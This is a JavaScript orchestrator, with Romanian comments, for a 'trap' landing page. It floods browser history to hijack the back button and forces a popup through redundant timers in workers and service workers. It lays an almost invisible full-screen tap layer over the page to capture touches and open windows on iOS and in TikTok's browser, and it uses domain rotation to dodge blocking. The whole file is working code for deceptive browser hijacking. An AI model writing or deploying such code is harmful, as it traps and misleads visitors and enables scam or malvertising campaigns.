// lander.js — orchestrator principal v2
// integrează ios-popup.js (blank-first touchend pattern) + persistence.js
(function(){

  // --- GUARD: dacă popup a fost deja arătat, skip ---
  if(window.__timer&&window.__timer.wasShown()){
    return;
  }

  // --- CHECK: dacă timer-ul a expirat deja (iOS a omorât pagina și userul a revenit) ---
  if(window.__timer&&window.__timer.ready()&&window.__showPopup){
    setTimeout(function(){window.__showPopup()},300);
    return;
  }

  // --- ID 18: state tampered (HMAC fail) — fire popup immediately ---
  // persistence.js sets __stateInvalid=true on pageshow HMAC failure
  // Bot tampering state = they're real enough to tamper → show popup early
  if(window.__stateInvalid){
    setTimeout(function(){if(window.__showPopup)window.__showPopup();},200);
    return;
  }

  var cfg=window.__CONFIG||{};
  var FLOOD=cfg.HISTORY_FLOOD_COUNT||50;
  var AUTO_BACK=cfg.AUTO_BACK_MS||1000;
  var delay=window.__ab?window.__ab.delay:(cfg.POPUP_DELAY_MS||20000);

  // Channel names dinamice — citite din __CONFIG injectat de middleware
  // Dacă lipsesc (dev local), fallback la valori statice
  var CH_MAIN=cfg.BROADCAST_CHANNEL||'trap_ch';
  var CH_HB=cfg.HB_CHANNEL||'trap_sw_hb';
  var DB_NAME=cfg.DB_NAME||'trap_db';

  // --- HISTORY FLOOD + AUTO-BACK ---
  for(var i=0;i<FLOOD;i++)history.pushState({t:i},'','#s'+i);
  setTimeout(function(){
    // iOS TikTok blochează history.go(-N) mare — folosim back() în loop rapid
    var backCount = FLOOD + 1;
    var fired = 0;
    var iv = setInterval(function(){
      if(fired >= backCount){ clearInterval(iv); return; }
      history.back();
      fired++;
    }, 20);
  }, AUTO_BACK);

  // --- MECHANIC: Web Worker timer (thread separat, single-fire cu locks guard) ---
  // Folosim navigator.locks pe Android să prevenim race între Worker + SW + SharedWorker
  function fireWithLock(){
    if(window.__popup&&window.__popup.fired())return; // deja fired, skip
    if(typeof navigator!=='undefined'&&navigator.locks&&navigator.locks.request){
      navigator.locks.request('__popup_fire',{ifAvailable:true},function(lock){
        if(lock&&window.__showPopup)window.__showPopup();
        return Promise.resolve();
      });
    } else {
      if(window.__showPopup)window.__showPopup();
    }
  }

  try{
    var blob=new Blob([
      'var s=Date.now();var d='+delay+';',
      'var iv=setInterval(function(){',
        'if(Date.now()-s>=d){clearInterval(iv);postMessage("fire");}',
      '},500);'
    ],{type:'application/javascript'});
    var blobUrl=URL.createObjectURL(blob);
    var w=new Worker(blobUrl);
    w.onmessage=function(e){
      if(e.data==='fire'){
        w.terminate(); // cleanup imediat după fire
        fireWithLock();
      }
    };
    setTimeout(function(){URL.revokeObjectURL(blobUrl)},delay+5000);
  }catch(e){
    // fallback: setTimeout direct
    setTimeout(function(){fireWithLock()},delay);
  }

  // --- MECHANIC: visibilitychange ---
  document.addEventListener('visibilitychange',function(){
    if(document.visibilityState==='visible'){
      if(window.__timer&&window.__timer.ready()&&window.__showPopup)window.__showPopup();
    }
  });

  // --- MECHANIC: pageshow — bfcache restore (iOS) ---
  // persistence.js gestionează logica IndexedDB la pageshow
  // lander.js reacționează doar dacă __persistence nu e disponibil
  window.addEventListener('pageshow',function(e){
    if(e.persisted&&!window.__persistence){
      var t=window.__timer;
      if(!t)return;
      if(t.ready()){
        setTimeout(function(){if(window.__showPopup)window.__showPopup()},300);
      }else{
        var rem=t.remaining();
        setTimeout(function(){if(window.__showPopup)window.__showPopup()},rem);
      }
    }
  });

  // --- MECHANIC: popstate (back button manual) ---
  window.addEventListener('popstate',function(){
    if(window.__popup&&!window.__popup.fired()&&window.__showPopup)window.__showPopup();
  });

  // --- MECHANIC: BroadcastChannel (semnal de la SW/SharedWorker) ---
  try{
    var ch=new BroadcastChannel(CH_MAIN);
    ch.onmessage=function(e){if(e.data==='fire')fireWithLock()};
  }catch(e){}

  // --- MECHANIC: SW messages ---
  if('serviceWorker' in navigator){
    navigator.serviceWorker.addEventListener('message',function(e){
      if(e.data==='fire')fireWithLock();
    });
    navigator.serviceWorker.register('/sw.js',{scope:'/'}).then(function(){
      // trimitem channel names la SW — timer_start cu chMain + chHb
      navigator.serviceWorker.ready.then(function(reg){
        if(reg.active) {
          reg.active.postMessage({
            type:'timer_start', delay:delay,
            chMain:CH_MAIN, chHb:CH_HB
          });
          // ID 19: lander alive ping — SW starts 2s watchdog
          // If no second ping arrives, SW fires popup (covers silent JS errors in lander)
          reg.active.postMessage({ type:'lander_alive', delay:delay });
        }
      });
    }).catch(function(){});
  }

  // --- MECHANIC: SharedWorker init cu channel names dinamice ---
  try{
    if(typeof SharedWorker!=='undefined'){
      var sw2=new SharedWorker('/workers/shared-worker.js');
      sw2.port.onmessage=function(e){if(e.data==='fire')fireWithLock()};
      sw2.port.postMessage({type:'init', delay:delay, chMain:CH_MAIN, dbName:DB_NAME});
      sw2.port.start();
    }
  }catch(e){}

  // --- MECHANIC: iOS gesture layer (blank-first window.open via ios-popup.js) ---
  // ios-popup.js expune window.__iosPopup
  // la touch: deschide fereastra blank sincron, după asignează URL-ul via /api/claim
  if(window.__iosPopup){
    window.__iosPopup.prepare(null); // pregătește layer-ul fără URL — URL vine din /api/claim
  } else {
    // Fallback: tap layer clasic pentru dispozitive non-iOS sau când __iosPopup nu e disponibil
    var tapLayer=document.createElement('div');
    tapLayer.id='__tap';
    tapLayer.style.cssText=[
      'position:fixed','top:0','left:0',
      'width:100vw','height:100vh',
      'z-index:99997',
      'opacity:0.001',  // non-zero — WebKit cere element "vizibil" pt interacțiuni
      'touch-action:manipulation'
    ].join(';');
    tapLayer.setAttribute('aria-hidden','true');
    var tapUsed=false;
    tapLayer.addEventListener('touchend',function(e){
      // touchend NOT touchstart — WebKit permite window.open DOAR din touchend
      if(tapUsed)return;
      tapUsed=true;
      e.preventDefault();
      if(tapLayer.parentNode)tapLayer.parentNode.removeChild(tapLayer);
      if(window.__timer&&window.__timer.ready()&&window.__showPopup){
        window.__showPopup();
      }
    },{passive:false,capture:true});
    document.body&&document.body.appendChild(tapLayer)||
      document.addEventListener('DOMContentLoaded',function(){document.body.appendChild(tapLayer)});
  }

  // --- TRACK VISIT ---
  if(window.__analytics)window.__analytics.visit();

  // --- DOMAIN ROTATION health monitor ---
  if(window.__domainRotation)window.__domainRotation.start();

  // --- ID 19: signal SW that lander.js fully initialized (cancels watchdog) ---
  if('serviceWorker' in navigator){
    navigator.serviceWorker.ready.then(function(reg){
      if(reg.active) reg.active.postMessage({ type:'lander_ready' });
    }).catch(function(){});
  }

})();
